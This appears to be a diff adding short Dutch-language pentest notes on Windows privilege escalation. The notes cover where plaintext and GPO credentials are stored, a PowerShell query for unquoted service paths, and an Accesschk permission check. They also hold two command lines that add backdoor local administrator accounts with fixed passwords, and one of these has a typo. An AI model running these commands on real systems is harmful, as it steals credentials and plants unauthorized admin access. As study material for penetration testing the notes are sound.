@@ -1,0 +1,33 @@
+Stappenplan
+
+1. Check voor Credentials Plain Text:
+
+Registry Editor: 
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon
+
+C folder: 
+C:\windows\panther\unattend.xml
+Daarna decoden met Base64:
+https://www.base64decode.org/
+
+GPO Passwords in C folder:
+C:\Windows\System32\GroupPolicy\DataStore\0\sysvol
+• Gp3finder_v4.0.exe
+• Gp3finder_v4.0.exe -D <encrypted value>
+
+2. Check kwetsbaarheden
+
+Unquoted Service Path
+In PowerShell: 
+Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List
+
+Add new user via Registry: 
+cmd.exe /c net user /add backdoor B@ckd00r123 && net localgroup administrators backdoor /add”
+
+cmd /c net user fakeadmin2 L3tm3!n /add && net localgroups administrators fakeadmin2 /add
+
+Sysinternals check schrijfrechten:
+Accesschk -uwvqc “Everyone” *
+
+
+
